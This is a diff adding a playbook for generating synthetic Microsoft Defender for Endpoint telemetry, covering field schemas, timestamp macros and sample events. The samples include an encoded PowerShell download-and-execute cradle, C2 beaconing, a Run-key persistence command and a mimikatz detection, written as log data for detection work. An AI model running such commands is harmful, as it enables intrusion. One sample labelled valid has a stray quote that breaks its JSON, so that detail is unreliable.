@@ -1,0 +1,268 @@
+# AI Generation Playbook: Microsoft Defender for Endpoint (MDE) Streaming Telemetry
+
+---
+
+## 1. Overview & Log Purpose
+
+**Microsoft Defender for Endpoint (MDE)** is an enterprise endpoint detection and response (EDR) and endpoint protection platform (EPP). When configured to export raw event telemetry via Azure Monitor / Event Hub / Azure Storage diagnostic settings, it publishes high-fidelity Advanced Hunting telemetry streams.
+
+### Primary Activities Recorded:
+* **Process Activities (`DeviceProcessEvents`)**: Process creation, command line arguments, parent-child relationships, integrity levels, and hash verification.
+* **Network Traffic (`DeviceNetworkEvents`, `DeviceNetworkInfo`)**: Outbound/inbound TCP/UDP connections, listening ports, remote IPs/URLs, and adapter configurations.
+* **Authentication & Access (`DeviceLogonEvents`)**: Local, network, interactive, and service logons, user SIDs, authentication protocols, and failure reasons.
+* **File System (`DeviceFileEvents`)**: File creation, modification, deletion, renaming, and file origin indicators.
+* **Registry (`DeviceRegistryEvents`)**: Key/value modifications, deletions, and value types (e.g., `REG_SZ`, `REG_DWORD`).
+* **Binary Loads (`DeviceImageLoadEvents`)**: DLL and driver module loads into memory space.
+* **System & Security Events (`DeviceEvents`)**: PowerShell script execution, AMSI detections, SmartScreen warnings, local account manipulation, kernel remote API calls (`NtAllocateVirtualMemory`), and service installations.
+* **Alerts (`DeviceAlertEvents`)**: Native MDE detections, antivirus alerts, and MITRE ATT&CK mappings.
+* **Asset Inventory (`DeviceInfo`)**: OS version, machine group, logged-on users, and Azure AD / Entra enrollment status.
+
+---
+
+## 2. Format Specification
+
+* **Log Format**: JSON (Single-line NDJSON / JSON Lines).
+* **Wrapper Specification**: Azure Monitor Diagnostic Log format for Microsoft 365 Defender.
+* **Character Encoding**: UTF-8.
+* **Escaping & Quoting Rules**:
+  * All JSON string values are double-quoted.
+  * Windows file paths require double-escaped backslashes (`C:\\Windows\\System32\\cmd.exe`).
+  * Nested objects within fields such as `properties.AdditionalFields`, `properties.LoggedOnUsers`, `properties.IPAddresses`, and `properties.DnsAddresses` are **stringified JSON** (JSON objects/arrays encoded as escaped strings inside the outer JSON).
+  * Double quotes inside command lines or nested scripts must be escaped with `\"` or `\\\"` depending on the nesting depth.
+
+---
+
+## 3. Schema Breakdown & Fields
+
+### 3.1. Top-Level Wrapper Envelope
+
+| Field | Type | Required | Description | Typical Values / Format |
+|---|---|---|---|---|
+| `time` | String (ISO 8601) | Yes | Diagnostic ingestion timestamp | `YYYY-MM-DDTHH:MM:SS.fffffffZ` |
+| `tenantId` | String (GUID) | Yes | Azure Active Directory / Entra Tenant ID | `ed236696-8612-40d7-8b49-xxxxxxxxxxxx` |
+| `operationName` | String | Yes | Logging operation name | Constantly `"Publish"` |
+| `category` | String | Yes | Telemetry table category | `AdvancedHunting-<Table>` |
+| `properties` | Object | Yes | Table-specific payload | See table definitions below |
+
+#### Supported Categories (`category`):
+* `AdvancedHunting-DeviceProcessEvents`
+* `AdvancedHunting-DeviceNetworkEvents`
+* `AdvancedHunting-DeviceLogonEvents`
+* `AdvancedHunting-DeviceFileEvents`
+* `AdvancedHunting-DeviceRegistryEvents`
+* `AdvancedHunting-DeviceImageLoadEvents`
+* `AdvancedHunting-DeviceEvents`
+* `AdvancedHunting-DeviceInfo`
+* `AdvancedHunting-DeviceNetworkInfo`
+* `AdvancedHunting-DeviceAlertEvents`
+
+---
+
+### 3.2. Common Properties (Present across most tables)
+
+| Field | Type | Description | Example / Distribution |
+|---|---|---|---|
+| `Timestamp` | String (ISO 8601) | Event generation timestamp on sensor | `2023-11-15T14:22:10.1234567Z` |
+| `DeviceId` | String (Hex) | 40-character unique sensor machine ID | `f5bc5ac6d6cc600bbc38a0f9bc363b9d63034f4f` |
+| `DeviceName` | String | NetBIOS name or FQDN of the endpoint | `WORKSTATION-01`, `dc01.corp.contoso.com` |
+| `ReportId` | Integer | Unique event identifier counter | `113972`, `4430` |
+| `MachineGroup` | String / Null | Group name configured in Defender | `"UnassignedGroup"`, `"Production Servers"`, `null` |
+| `AppGuardContainerId` | String / Null | Windows Defender Application Guard container | `""`, `null` |
+
+---
+
+### 3.3. Initiating Process Fields (Present in Process, File, Network, Registry, Events, ImageLoad)
+
+| Field | Type | Description | Example Values |
+|---|---|---|---|
+| `InitiatingProcessFolderPath` | String / Null | Full folder path of initiating binary | `C:\\Windows\\System32`, `C:\\Program Files\\...` |
+| `InitiatingProcessFileName` | String / Null | Binary name of the initiating process | `cmd.exe`, `powershell.exe`, `svchost.exe` |
+| `InitiatingProcessId` | Integer / Null | PID of the initiating process | `4884`, `10572` |
+| `InitiatingProcessCommandLine` | String / Null | CLI arguments of initiating process | `powershell.exe -ExecutionPolicy Bypass ...` |
+| `InitiatingProcessCreationTime` | String / Null | Sensor start time of initiating process | ISO 8601 timestamp |
+| `InitiatingProcessParentId` | Integer / Null | PPID of initiating process | `848`, `1012` |
+| `InitiatingProcessParentFileName`| String / Null | File name of initiating process parent | `services.exe`, `explorer.exe`, `wininit.exe` |
+| `InitiatingProcessParentCreationTime` | String / Null | Start time of the initiating parent process | ISO 8601 timestamp |
+| `InitiatingProcessAccountDomain` | String / Null | Domain name of initiating account | `CORP`, `NT AUTHORITY`, `DESKTOP-01` |
+| `InitiatingProcessAccountName` | String / Null | Username of initiating account | `SYSTEM`, `Administrator`, `jdoe` |
+| `InitiatingProcessAccountSid` | String / Null | SID of initiating account | `S-1-5-18`, `S-1-5-21-...-1001` |
+| `InitiatingProcessAccountUpn` | String / Null | UPN of initiating account | `jdoe@contoso.com`, `null` |
+| `InitiatingProcessAccountObjectId` | String / Null | Azure AD Object ID of user | GUID or `null` |
+| `InitiatingProcessIntegrityLevel`| String / Null | Integrity level | `"System"`, `"High"`, `"Medium"`, `"Low"`, `"Untrusted"` |
+| `InitiatingProcessTokenElevation`| String / Null | Elevation status | `"TokenElevationTypeDefault"`, `"TokenElevationTypeFull"`, `"TokenElevationTypeLimited"`, `"None"` |
+| `InitiatingProcessMD5` | String / Null | 32-character hex MD5 | `f586835082f632dc8d9404d83bc16316` |
+| `InitiatingProcessSHA1` | String / Null | 40-character hex SHA-1 | `010db07461e45b41c886192df6fd425ba8d42d82` |
+| `InitiatingProcessSHA256` | String / Null | 64-character hex SHA-256 | `1fe531eac592b480aa4bd16052b909c34314...` |
+| `InitiatingProcessFileSize` | Integer / Null | Initiating process size in bytes | `52744`, `2759232` |
+| `InitiatingProcessVersionInfo*` | String / Null | Version fields: `CompanyName`, `ProductName`, `ProductVersion`, `InternalFileName`, `OriginalFileName`, `FileDescription` | `"Microsoft Corporation"`, `"Windows® Operating System"`, etc. |
+
+---
+
+### 3.4. Category-Specific Schema Details
+
+#### A. `AdvancedHunting-DeviceProcessEvents`
+* **`ActionType`**: `"ProcessCreated"`, `"ProcessTerminated"`
+* **Core Fields**:
+  * `FileName`: Name of the spawned process (`powershell.exe`, `rundll32.exe`, `whoami.exe`).
+  * `FolderPath`: Target executable folder path.
+  * `ProcessCommandLine`: Full execution command line.
+  * `ProcessId`: Spawned Process ID (PID).
+  * `ProcessCreationTime`: Timestamp when process spawned.
+  * `ProcessIntegrityLevel`: `"System"`, `"High"`, `"Medium"`, `"Low"`.
+  * `ProcessTokenElevation`: `"TokenElevationTypeDefault"`, `"TokenElevationTypeFull"`, `"TokenElevationTypeLimited"`.
+  * `AccountDomain`, `AccountName`, `AccountSid`, `AccountUpn`, `AccountObjectId`, `LogonId`.
+  * `MD5`, `SHA1`, `SHA256`, `FileSize`.
+
+#### B. `AdvancedHunting-DeviceFileEvents`
+* **`ActionType`**: `"FileCreated"`, `"FileModified"`, `"FileDeleted"`, `"FileRenamed"`, `"FileOpen"`
+* **Core Fields**:
+  * `FileName`: Name of target file.
+  * `FolderPath`: Absolute file path.
+  * `FileSize`: Size in bytes.
+  * `MD5`, `SHA1`, `SHA256`: Hash strings or `null`.
+  * `PreviousFileName`, `PreviousFolderPath`: Used for `"FileRenamed"` events.
+  * `RequestProtocol`: `"Local"`, `"SMB"`, `"NFS"`.
+  * `RequestAccountName`, `RequestAccountDomain`, `RequestAccountSid`.
+
+#### C. `AdvancedHunting-DeviceNetworkEvents`
+* **`ActionType`**: `"ConnectionSuccess"`, `"ConnectionFailed"`, `"ListeningConnectionCreated"`, `"InboundConnectionAccepted"`
+* **Core Fields**:
+  * `LocalIP`: IPv4 / IPv6 of local host.
+  * `LocalPort`: Source ephemeral port (e.g., `49152`–`65535`).
+  * `RemoteIP`: Target IP address (RFC 1918 or Public).
+  * `RemotePort`: Destination port (`80`, `443`, `53`, `445`, `8080`, `8443`).
+  * `RemoteUrl`: Destination URL / FQDN (e.g., `https://login.microsoftonline.com`).
+  * `Protocol`: `"TcpV4"`, `"TcpV6"`, `"UdpV4"`, `"UdpV6"`.
+
+#### D. `AdvancedHunting-DeviceLogonEvents`
+* **`ActionType`**: `"LogonSuccess"`, `"LogonFailed"`, `null`
+* **Core Fields**:
+  * `LogonType`: `"Interactive"`, `"RemoteInteractive"` (RDP), `"Network"` (SMB/RPC), `"Service"`, `"CachedInteractive"`, `"Batch"`, `"Unlock"`.
+  * `AccountName`, `AccountDomain`, `AccountSid`, `LogonId`.
+  * `FailureReason`: `"InvalidUserNameOrPassword"`, `"AccountDisabled"`, `"UnknownUserOrBadPassword"`, `null`.
+  * `Protocol`: `"Negotiate"`, `"Kerberos"`, `"NTLM"`, `"MICROSOFT_AUTHENTICATION_PACKAGE_V1_0"`.
+  * `RemoteIP`, `RemotePort`, `RemoteDeviceName`.
+  * `AdditionalFields`: Stringified JSON containing `{"IsLocalLogon": true/false, "Upn": "..."}`.
+
+#### E. `AdvancedHunting-DeviceRegistryEvents`
+* **`ActionType`**: `"RegistryValueSet"`, `"RegistryKeyCreated"`, `"RegistryKeyDeleted"`, `"RegistryValueDeleted"`
+* **Core Fields**:
+  * `RegistryKey`: Full hive & key path (`HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run`).
+  * `RegistryValueName`: Target entry name (e.g., `"CrashHeartbeat"`, `"RunKey"`).
+  * `RegistryValueData`: String or numeric representation of value.
+  * `RegistryValueType`: `"String"`, `"ExpandString"`, `"Binary"`, `"Dword"`, `"Qword"`, `"MultiString"`.
+  * `PreviousRegistryKey`, `PreviousRegistryValueName`, `PreviousRegistryValueData`.
+
+#### F. `AdvancedHunting-DeviceEvents` (Generic / System / Antivirus / Script Telemetry)
+* **`ActionType`**:
+  * `"PowerShellCommand"`
+  * `"DnsQueryResponse"`
+  * `"AntivirusDetection"`
+  * `"SmartScreenUrlWarning"`
+  * `"ServiceInstalled"`
+  * `"NtAllocateVirtualMemoryRemoteApiCall"`
+  * `"ProcessPrimaryTokenModified"`
+  * `"ScriptContent"`
+  * `"GetClipboardData"`
+* **Core Fields**:
+  * `AdditionalFields`: Heavily populated stringified JSON depending on `ActionType`:
+    * *PowerShellCommand*: `{"Command": "Get-Process | Where-Object ..."}`
+    * *DnsQueryResponse*: `{"DnsQueryString": "domain.com", "DnsQueryResult": ["{\"DnsQueryType\":\"A\",\"Result\":\"1.2.3.4\"}"]}`
+    * *AntivirusDetection*: `{"ThreatName": "Trojan:Win32/CobaltStrike", "WasRemediated": true, "WasExecutingWhileDetected": false, "ResourceSchema": "file", "ReportSource": "WindowsDefender"}`
+    * *ServiceInstalled*: `{"ServiceName": "MalSvc", "ServiceType": 1, "ServiceStartType": 2, "ServiceAccount": "LocalSystem"}`
+
+#### G. `AdvancedHunting-DeviceInfo`
+* **Core Fields**:
+  * `OSPlatform`: `"Windows10"`, `"Windows11"`, `"WindowsServer"`, `"macOS"`, `"Linux"`.
+  * `OSVersion`, `OSBuild`, `OSArchitecture` (`"64-bit"`).
+  * `PublicIP`: Sensor egress IP.
+  * `LoggedOnUsers`: Stringified JSON array: `"[{\"UserName\":\"alice\",\"DomainName\":\"CORP\",\"Sid\":\"S-1-5-21-...\"}]"`.
+  * `IsAzureADJoined`: `true` / `false`.
+  * `AadDeviceId`, `DeviceObjectId`: GUID or `null`.
+  * `OnboardingStatus`: `"Onboarded"`, `"CanBeOnboarded"`.
+  * `ClientVersion`: Sensor agent version (e.g., `10.8210.19041.1001`).
+
+---
+
+## 4. Timestamp & Dynamic Time Templating
+
+The log schema uses **ISO 8601 UTC timestamps with 7 fractional second digits** (`YYYY-MM-DDTHH:MM:SS.fffffffZ`).
+
+### Timestamp Fields & Relationships:
+1. `time` (Outer wrapper): Cloud ingest timestamp.
+2. `properties.Timestamp` (Sensor event time): Generated on the endpoint; typically **0–180 seconds earlier** than `time`.
+3. `properties.ProcessCreationTime` / `InitiatingProcessCreationTime`: When the active process was instantiated.
+4. `properties.InitiatingProcessParentCreationTime`: When the parent process was instantiated (must be $\le$ `InitiatingProcessCreationTime`).
+
+### Macro Templating Syntax:
+When generating synthetic events, dynamic timestamp macros calculate chronologically consistent timelines:
+
+* Outer Ingestion: `##$TimeStamp-0d0h2m0s$##` (Format: `2023-10-25T14:30:00.1234567Z`)
+* Sensor Detection: `##$TimeStamp-0d0h2m15s$##`
+* Process Creation: `##$TimeStamp-0d0h2m16s$##`
+* Parent Process Creation: `##$TimeStamp-0d4h30m0s$##`
+
+---
+
+## 5. Concrete Valid Examples
+
+### Example 1: `DeviceProcessEvents` — Suspicious PowerShell Execution (Living off the Land)
+```json
+{"time":"##$TimeStamp-0d0h1m30s$##","tenantId":"a1b2c3d4-e5f6-7a8b-9c0d-1e2f3a4b5c6d","operationName":"Publish","category":"AdvancedHunting-DeviceProcessEvents","properties":{"ProcessIntegrityLevel":"High","AccountSid":"S-1-5-21-2837461928-1092837465-987234123-1001","LogonId":1489201,"AccountName":"jsmith","AccountDomain":"CORP","AccountUpn":"jsmith@corp.contoso.com","AccountObjectId":"8a12bc34-56de-78fa-90bc-123456789abc","ProcessTokenElevation":"TokenElevationTypeFull","ProcessCreationTime":"##$TimeStamp-0d0h1m35s$##","ProcessId":8412,"FileName":"powershell.exe","ProcessCommandLine":"powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADEALgAxADAAMAAvAHMAYwByAGkAcAB0AC4AcABzADEAJwApAA==","FolderPath":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","FileSize":452608,"MD5":"04029e121a0cfa5991749937dd22a1d9","SHA256":"9f914d42706fe215501044acd85a32d58aaef1419d404fddfa5d3b48f66ccd9f","SHA1":"f43d9bb316e30ae1a3494ac5b0624f6bea1bf054","AdditionalFields":null,"InitiatingProcessFolderPath":"C:\\Windows\\System32\\cmd.exe","InitiatingProcessFileSize":289792","InitiatingProcessMD5":"d0fce3a24aa32e167912204d6f8f7ed8","InitiatingProcessSHA256":"8c7e3e09886479f643f8e02d91b489c44d717f91722eefd1d1f0ffc06f36601f","InitiatingProcessSHA1":"61a35e4d2d486981cfd8c7c97a8e578496426db4","InitiatingProcessLogonId":1489201,"InitiatingProcessAccountSid":"S-1-5-21-2837461928-1092837465-987234123-1001","InitiatingProcessAccountDomain":"CORP","InitiatingProcessAccountName":"jsmith","InitiatingProcessAccountUpn":"jsmith@corp.contoso.com","InitiatingProcessAccountObjectId":"8a12bc34-56de-78fa-90bc-123456789abc","InitiatingProcessCreationTime":"##$TimeStamp-0d0h2m10s$##","InitiatingProcessId":5120,"InitiatingProcessFileName":"cmd.exe","InitiatingProcessCommandLine":"\"cmd.exe\" /c C:\\Users\\jsmith\\AppData\\Local\\Temp\\run.bat","InitiatingProcessParentCreationTime":"##$TimeStamp-0d3h15m00s$##","InitiatingProcessParentId":1488,"InitiatingProcessParentFileName":"explorer.exe","InitiatingProcessIntegrityLevel":"High","InitiatingProcessTokenElevation":"TokenElevationTypeFull","DeviceId":"4e65b204a8d1a2238a5f05c8d0a4b0980a9eeab2","AppGuardContainerId":"","MachineGroup":"Corporate Workstations","Timestamp":"##$TimeStamp-0d0h1m34s$##","DeviceName":"corp-ws-0442","ReportId":892301,"ActionType":"ProcessCreated"}}
+```
+
+### Example 2: `DeviceNetworkEvents` — Outbound C2 Beaconing
+```json
+{"time":"##$TimeStamp-0d0h0m45s$##","tenantId":"a1b2c3d4-e5f6-7a8b-9c0d-1e2f3a4b5c6d","operationName":"Publish","category":"AdvancedHunting-DeviceNetworkEvents","properties":{"RemotePort":8443,"RemoteIP":"198.51.100.45","Protocol":"TcpV4","LocalIP":"10.0.4.15","LocalPort":58214,"RemoteUrl":"https://update-service-cdn.org","LocalIPType":"Private","RemoteIPType":"Public","AdditionalFields":"{}","ActionType":"ConnectionSuccess","InitiatingProcessFolderPath":"C:\\Windows\\System32\\rundll32.exe","InitiatingProcessFileSize":71680,"InitiatingProcessMD5":"ef3179d498792bf4813959146051787c","InitiatingProcessSHA256":"581898b9f481c96939922a9eb78beff9ad1d0cc7b9f874ab0cfbe7c7774d6c62","InitiatingProcessSHA1":"a9df8d03588df8849b2518e97f02f9c3ff4b58c7","InitiatingProcessAccountSid":"S-1-5-21-2837461928-1092837465-987234123-1001","InitiatingProcessAccountDomain":"CORP","InitiatingProcessAccountName":"jsmith","InitiatingProcessAccountUpn":"jsmith@corp.contoso.com","InitiatingProcessAccountObjectId":"8a12bc34-56de-78fa-90bc-123456789abc","InitiatingProcessCreationTime":"##$TimeStamp-0d0h5m12s$##","InitiatingProcessId":7816,"InitiatingProcessFileName":"rundll32.exe","InitiatingProcessCommandLine":"rundll32.exe C:\\Users\\jsmith\\AppData\\Local\\Temp\\update.dll,EntryPoint","InitiatingProcessParentCreationTime":"##$TimeStamp-0d0h5m20s$##","InitiatingProcessParentId":8412,"InitiatingProcessParentFileName":"powershell.exe","InitiatingProcessIntegrityLevel":"Medium","InitiatingProcessTokenElevation":"TokenElevationTypeLimited","DeviceId":"4e65b204a8d1a2238a5f05c8d0a4b0980a9eeab2","AppGuardContainerId":"","MachineGroup":"Corporate Workstations","Timestamp":"##$TimeStamp-0d0h0m50s$##","DeviceName":"corp-ws-0442","ReportId":892415}}
+```
+
+### Example 3: `DeviceLogonEvents` — Failed Network Logon (Brute Force / Password Spray)
+```json
+{"time":"##$TimeStamp-0d0h0m20s$##","tenantId":"a1b2c3d4-e5f6-7a8b-9c0d-1e2f3a4b5c6d","operationName":"Publish","category":"AdvancedHunting-DeviceLogonEvents","properties":{"LogonType":"Network","AccountDomain":"CORP","AccountSid":null,"AccountName":"svc_backup","IsLocalAdmin":null,"RemoteDeviceName":"KALI-ATTACKER","RemoteIP":"10.0.10.88","RemoteIPType":"Private","RemotePort":50114,"LogonId":null,"Protocol":"NTLM","FailureReason":"InvalidUserNameOrPassword","AdditionalFields":"{\"IsLocalLogon\":false}","ActionType":"LogonFailed","InitiatingProcessFolderPath":"C:\\Windows\\System32","InitiatingProcessFileName":"lsass.exe","InitiatingProcessFileSize":46080,"InitiatingProcessMD5":"7f6874e4c2782b13fa250dbf7f18b320","InitiatingProcessSHA256":"b99332e987f2ff839a82cdba56c071d0e51381395ea2c37e96b349f4cd859cf2","InitiatingProcessSHA1":"5f088a8d9a444a1e94a8f9c1db13994e6e289c02","InitiatingProcessAccountSid":"S-1-5-18","InitiatingProcessAccountDomain":"NT AUTHORITY","InitiatingProcessAccountName":"SYSTEM","InitiatingProcessAccountUpn":null,"InitiatingProcessAccountObjectId":null,"InitiatingProcessCreationTime":"##$TimeStamp-2d14h00m00s$##","InitiatingProcessId":688,"InitiatingProcessCommandLine":"C:\\Windows\\system32\\lsass.exe","InitiatingProcessParentCreationTime":"##$TimeStamp-2d14h00m05s$##","InitiatingProcessParentId":592,"InitiatingProcessParentFileName":"wininit.exe","InitiatingProcessIntegrityLevel":"System","InitiatingProcessTokenElevation":"TokenElevationTypeDefault","DeviceId":"9c22f058aecf2c95497dfdfd9040dabec5309be9","AppGuardContainerId":"","MachineGroup":"Production Domain Controllers","Timestamp":"##$TimeStamp-0d0h0m22s$##","DeviceName":"dc-01.corp.contoso.com","ReportId":190244}}
+```
+
+### Example 4: `DeviceEvents` — Malware Detection by Microsoft Defender Antivirus
+```json
+{"time":"##$TimeStamp-0d0h0m10s$##","tenantId":"a1b2c3d4-e5f6-7a8b-9c0d-1e2f3a4b5c6d","operationName":"Publish","category":"AdvancedHunting-DeviceEvents","properties":{"AccountSid":"S-1-5-18","AccountDomain":"NT AUTHORITY","AccountName":"SYSTEM","LogonId":999,"FileName":"mimikatz.exe","FolderPath":"C:\\Users\\jsmith\\Downloads\\mimikatz.exe","MD5":"c31c8282361b203c6a46cfef276c1523","SHA1":"58a69eb0702d7e97d1976aa11df83ff7ef21a4f0","FileSize":1258496,"SHA256":"8f45a198c603126f584e03f905c10a3952f4166ebfa5cb0460c5dbb03cfb2e00","ProcessCreationTime":null,"ProcessTokenElevation":null,"RemoteUrl":null,"RegistryKey":null,"RegistryValueName":null,"RegistryValueData":null,"RemoteDeviceName":null,"FileOriginIP":null,"FileOriginUrl":"https://github.com-releases.s3.amazonaws.com/mimikatz_trunk.zip","LocalIP":null,"LocalPort":null,"RemoteIP":null,"RemotePort":null,"ProcessId":null,"ProcessCommandLine":null,"AdditionalFields":"{\"ThreatName\":\"HackTool:Win32/Mimikatz.d\",\"WasExecutingWhileDetected\":false,\"WasRemediated\":true,\"ResourceSchema\":\"file\",\"ReportSource\":\"WindowsDefender\",\"DetectionGuid\":\"b429fa2b-86d1-4cb3-9844-320ecff94982\",\"IsPassiveMode\":false}","ActionType":"AntivirusDetection","InitiatingProcessVersionInfoCompanyName":"Microsoft Corporation","InitiatingProcessVersionInfoProductName":"Microsoft® Windows® Operating System","InitiatingProcessVersionInfoProductVersion":"4.18.23100.2009","InitiatingProcessVersionInfoInternalFileName":"MsMpEng.exe","InitiatingProcessVersionInfoOriginalFileName":"MsMpEng.exe","InitiatingProcessVersionInfoFileDescription":"Antimalware Service Executable","InitiatingProcessFolderPath":"C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\4.18.23100.2009-0\\MsMpEng.exe","InitiatingProcessFileName":"MsMpEng.exe","InitiatingProcessFileSize":148296,"InitiatingProcessMD5":"aa74e578c772c64070a2a4782bb57a84","InitiatingProcessSHA256":"65297fe5b707470f1a95e7d581ea30c00717247781b40280eb4c88d8b671a533","InitiatingProcessSHA1":"df1936e76cfebdfc0f055615f5a8a183785121b6","InitiatingProcessLogonId":999,"InitiatingProcessAccountSid":"S-1-5-18","InitiatingProcessAccountDomain":"NT AUTHORITY","InitiatingProcessAccountName":"SYSTEM","InitiatingProcessAccountUpn":null,"InitiatingProcessAccountObjectId":null,"InitiatingProcessCreationTime":"##$TimeStamp-2d14h00m00s$##","InitiatingProcessId":3216,"InitiatingProcessCommandLine":"\"MsMpEng.exe\"","InitiatingProcessParentCreationTime":"##$TimeStamp-2d14h00m05s$##","InitiatingProcessParentId":848,"InitiatingProcessParentFileName":"services.exe","DeviceId":"4e65b204a8d1a2238a5f05c8d0a4b0980a9eeab2","AppGuardContainerId":"","MachineGroup":"Corporate Workstations","Timestamp":"##$TimeStamp-0d0h0m12s$##","DeviceName":"corp-ws-0442","ReportId":892560}}
+```
+
+### Example 5: `DeviceRegistryEvents` — Run Key Persistence Modification
+```json
+{"time":"##$TimeStamp-0d0h1m00s$##","tenantId":"a1b2c3d4-e5f6-7a8b-9c0d-1e2f3a4b5c6d","operationName":"Publish","category":"AdvancedHunting-DeviceRegistryEvents","properties":{"PreviousRegistryValueData":"","PreviousRegistryValueName":"","PreviousRegistryKey":"","RegistryValueData":"C:\\Users\\jsmith\\AppData\\Roaming\\updater.exe","RegistryValueType":"String","RegistryValueName":"SecurityUpdateAssist","RegistryKey":"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run","ActionType":"RegistryValueSet","InitiatingProcessFolderPath":"C:\\Windows\\System32\\reg.exe","InitiatingProcessFileName":"reg.exe","InitiatingProcessFileSize":63488,"InitiatingProcessMD5":"0811e5a513ec85a211b81804c868cb5a","InitiatingProcessSHA256":"3a077054321df4a84920959f6323c21bdba01407769cfcb5a2b1bb92f3922e92","InitiatingProcessSHA1":"3003eb8b2bf3ef673da49b4ae9622d9c222ff43e","InitiatingProcessAccountSid":"S-1-5-21-2837461928-1092837465-987234123-1001","InitiatingProcessAccountDomain":"CORP","InitiatingProcessAccountName":"jsmith","InitiatingProcessAccountUpn":"jsmith@corp.contoso.com","InitiatingProcessAccountObjectId":"8a12bc34-56de-78fa-90bc-123456789abc","InitiatingProcessCreationTime":"##$TimeStamp-0d0h1m05s$##","InitiatingProcessId":9948,"InitiatingProcessCommandLine":"reg.exe add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v SecurityUpdateAssist /t REG_SZ /d \"C:\\Users\\jsmith\\AppData\\Roaming\\updater.exe\" /f","InitiatingProcessParentCreationTime":"##$TimeStamp-0d0h1m35s$##","InitiatingProcessParentId":8412,"InitiatingProcessParentFileName":"powershell.exe","InitiatingProcessIntegrityLevel":"Medium","InitiatingProcessTokenElevation":"TokenElevationTypeLimited","DeviceId":"4e65b204a8d1a2238a5f05c8d0a4b0980a9eeab2","AppGuardContainerId":"","MachineGroup":"Corporate Workstations","Timestamp":"##$TimeStamp-0d0h1m02s$##","DeviceName":"corp-ws-0442","ReportId":892398}}
+```
+
+---
+
+## 6. Key Constraints & Pitfalls
+
+### Mandatory Fields
+* `time`, `tenantId`, `operationName`, `category`, and `properties` must always be present at the top level.
+* Inside `properties`, `Timestamp`, `DeviceId`, `DeviceName`, `ReportId`, and `ActionType` are critical for downstream ingestion pipelines and parsers.
+
+### Handling Null Values
+* MDE diagnostic streams explicitly output `null` for non-populated keys rather than omitting the key.
+* Strings representing empty states often default to `""` or `null` depending on whether the property was applicable (e.g., `AppGuardContainerId: ""`, `InitiatingProcessAccountUpn: null`).
+
+### Stringified Nested JSON Escaping
+* Nested objects (`AdditionalFields`, `LoggedOnUsers`, `IPAddresses`, `DnsAddresses`) must be serialized as valid **escaped JSON strings**, not direct JSON child objects:
+  ```json
+  // Correct
+  "AdditionalFields": "{\"IsLocalLogon\":true,\"Upn\":\"user@domain.com\"}"
+
+  // Incorrect (will fail parsing downstream)
+  "AdditionalFields": {"IsLocalLogon": true, "Upn": "user@domain.com"}
+  ```
+
+### Windows Path & Command-Line Escaping
+* Ensure all backslashes in Windows file paths and registry keys are double-escaped:
+  * File paths: `C:\\Windows\\System32\\cmd.exe`
+  * Registry hives: `HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\...`
+* Quotes in command line parameters must be properly escaped (`"\"C:\\Program Files\\...\""`).
+
+### Hex Hash Formatting
+* MD5 (32 chars), SHA-1 (40 chars), and SHA-256 (64 chars) are strictly lower-case hex characters.
+* `DeviceId` must be a 40-character lower-case hex string.
+
+### PID & PPID Hierarchy
+* Maintain logical PID/PPID structures (e.g., Parent process start time `InitiatingProcessParentCreationTime` must precede child process start time `InitiatingProcessCreationTime`).
+* System root processes (`wininit.exe`, `services.exe`, `lsass.exe`) should run as `NT AUTHORITY\SYSTEM` with `S-1-5-18` and `ProcessIntegrityLevel: "System"`.
